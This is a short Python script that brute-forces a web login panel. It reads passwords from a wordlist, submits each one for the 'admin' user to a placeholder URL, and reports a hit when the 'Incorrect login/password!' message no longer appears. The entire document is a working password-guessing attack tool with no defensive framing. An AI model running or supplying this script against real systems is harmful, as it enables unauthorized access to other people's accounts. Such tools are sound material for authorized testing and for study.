#!/usr/bin/env python

import requests

target_url = "https://target_url.com/index.php?"
login_panel = {"login": "admin", "password": ""}

with open("/path_to_list/passlist.txt") as wordlist:
    for line in wordlist:
        word = line.strip()
        login_panel["password"] = word
        response = requests.post(target_url, data=login_panel)
        if "Incorrect login/password!" not in response.content:
            print("[+] Password found! ==> " + word)
            print(response.content)
            exit()

print("[-] Password not found")
